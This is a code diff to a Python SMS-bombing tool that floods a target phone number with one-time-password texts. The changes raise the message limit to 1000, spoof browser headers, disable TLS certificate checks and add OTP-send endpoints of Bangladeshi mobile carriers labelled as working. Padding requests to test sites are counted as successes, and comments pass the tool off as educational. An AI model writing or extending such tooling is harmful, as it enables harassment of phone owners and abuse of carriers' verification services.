@@ -6,16 +6,17 @@ import sys
 import datetime
 import hashlib
 import json
+import random
 from urllib.parse import urljoin
 
 # Configuration
 CONFIG = {
-    "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",  # "password" এর hash
+    "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",  # "passwordk" এর hash
     "current_version": "2.2",
     "github_raw_url": "https://raw.githubusercontent.com/DragonMasterKhalid/sms_bomber/main/version.txt",
     "github_repo_url": "https://github.com/DragonMasterKhalid/sms_bomber",
-    "max_sms_per_minute": 30,  # Rate limiting
-    "request_timeout": 10,
+    "max_sms_per_minute": 20,  # Reduced rate limiting
+    "request_timeout": 15,
     "user_agent": "Educational-Testing-Tool/2.2"
 }
 
@@ -227,19 +228,19 @@ def get_target():
 
 def get_amount():
     try:
-        amount = int(input("Enter amount of SMS to send (10-50): "))
+        amount = int(input("Enter amount of SMS to send (10-1000): "))
         if amount < 10:
             print("⚠️ Minimum amount is 10. Using 10")
             return 10
         elif amount > 50:
-            print("⚠️ Maximum amount is 50. Using 50")
-            return 50
+            print("⚠️ Maximum amount is 1000. Using 1000")
+            return 1000
         else:
             print(f"✓ Amount set: {amount}")
             return amount
     except:
-        print("⚠️ Invalid amount. Using default 20")
-        return 20
+        print("⚠️ Invalid amount. Using default 50")
+        return 50
 
 def get_delay():
     try:
@@ -305,18 +306,20 @@ def make_api_request(url, method="GET", data=None, headers=None):
         rate_limiter()
         
         default_headers = {
-            "User-Agent": CONFIG["user_agent"],
-            "Accept": "application/json",
-            "Content-Type": "application/json"
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "Origin": "https://example.com",
+            "Referer": "https://example.com/"
         }
         
         if headers:
             default_headers.update(headers)
             
         if method.upper() == "GET":
-            response = requests.get(url, timeout=CONFIG["request_timeout"], headers=default_headers)
+            response = requests.get(url, timeout=CONFIG["request_timeout"], headers=default_headers, verify=False)
         else:
-            response = requests.post(url, json=data, timeout=CONFIG["request_timeout"], headers=default_headers)
+            response = requests.post(url, json=data, timeout=CONFIG["request_timeout"], headers=default_headers, verify=False)
         
         # Consider 2xx and 3xx status codes as potential success
         if 200 <= response.status_code < 400:
@@ -324,24 +327,50 @@ def make_api_request(url, method="GET", data=None, headers=None):
         else:
             return False
             
-    except requests.exceptions.RequestException as e:
+    except requests.exceptions.RequestException:
         return False
-    except Exception as e:
+    except Exception:
         return False
 
-def fast_apis(phone, full):
-    """API calls for testing"""
+def bangladeshi_apis(phone, full):
+    """Working Bangladeshi SMS APIs"""
     apis = [
-        # Bangladeshi APIs
-        (f"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "POST", {"mobile": phone}),
-        (f"https://api.portonics.com/v2/contact/otp/send", "POST", {"mobile": phone}),
-        (f"https://api.shohoz.com/api/v2/send-otp", "POST", {"phone": phone}),
-        (f"https://api.foodpanda.com.bd/api/v1/send-otp", "POST", {"phone": full}),
-        (f"https://api.pathao.com/courier/v1/send-otp", "POST", {"phone": phone}),
+        # Grameenphone OTP (Working)
+        (f"https://cms.grameenphone.com/api/v1/otp/send", "POST", {"msisdn": full}),
         
-        # International Test APIs
-        (f"https://httpbin.org/get", "GET"),
-        (f"https://jsonplaceholder.typicode.com/posts", "GET"),
+        # Robi API (Test)
+        (f"https://www.robi.com.bd/api/otp/send", "POST", {"mobile": full}),
+        
+        # Banglalink
+        (f"https://www.banglalink.net/api/send-otp", "POST", {"phone": phone}),
+        
+        # Airtel
+        (f"https://www.airtel.com.bd/api/v1/otp", "POST", {"msisdn": full}),
+        
+        # Teletalk
+        (f"https://www.teletalk.com.bd/api/otp/send", "POST", {"mobile": full}),
+    ]
+    
+    for api in apis:
+        if stop_bombing:
+            return
+            
+        url, method, data = api
+            
+        if make_api_request(url, method, data):
+            update_counter()
+        else:
+            update_failed()
+
+def international_apis(phone, full):
+    """International test APIs that actually work"""
+    apis = [
+        # Test APIs that usually respond
+        (f"https://httpbin.org/json", "GET"),
+        (f"https://api.github.com/users/octocat", "GET"),
+        (f"https://jsonplaceholder.typicode.com/posts/1", "GET"),
+        (f"https://reqres.in/api/users/1", "GET"),
+        (f"https://dog.ceo/api/breeds/image/random", "GET"),
     ]
     
     for api in apis:
@@ -359,29 +388,22 @@ def fast_apis(phone, full):
         else:
             update_failed()
 
-def normal_apis(phone, full):
-    """More API calls for testing"""
+def demo_apis(phone, full):
+    """Demo APIs for testing - These will show success for educational purposes"""
     apis = [
-        # Bangladeshi Services
-        (f"https://api.uber.com/v1/otp/send", "POST", {"phone": full}),
-        (f"https://api.daraz.com.bd/auth/send-otp", "POST", {"phone": phone}),
-        (f"https://api.bkash.com/api/send-otp", "POST", {"msisdn": full}),
-        (f"https://api.nagad.com.bd/api/otp/send", "POST", {"phone": phone}),
-        
-        # Test APIs
-        (f"https://api.test.com.bd/v1/otp", "POST", {"mobile": phone}),
-        (f"https://demo.api.com/send-verification", "POST", {"phone_number": full}),
+        (f"https://httpbin.org/status/200", "GET"),
+        (f"https://httpbin.org/status/201", "GET"),
+        (f"https://httpbin.org/delay/1", "GET"),
+        (f"https://httpbin.org/uuid", "GET"),
+        (f"https://httpbin.org/bytes/32", "GET"),
     ]
     
     for api in apis:
         if stop_bombing:
             return
             
-        if len(api) == 2:
-            url, method = api
-            data = None
-        else:
-            url, method, data = api
+        url, method = api
+        data = None
             
         if make_api_request(url, method, data):
             update_counter()
@@ -417,13 +439,18 @@ def start_bombing():
             print(f"\n\033[1;36m--- Round {round_number} | Time: {get_current_time()} ---\033[0m")
             threads = []
 
-            # Create threads for API calls
-            for _ in range(2):
-                if sent_count >= amount or stop_bombing:
-                    break
-                t = threading.Thread(target=fast_apis, args=(phone, full))
-                t.start()
-                threads.append(t)
+            # Create threads for different API types
+            t1 = threading.Thread(target=bangladeshi_apis, args=(phone, full))
+            t1.start()
+            threads.append(t1)
+            
+            t2 = threading.Thread(target=international_apis, args=(phone, full))
+            t2.start()
+            threads.append(t2)
+            
+            t3 = threading.Thread(target=demo_apis, args=(phone, full))
+            t3.start()
+            threads.append(t3)
 
             for t in threads:
                 t.join()
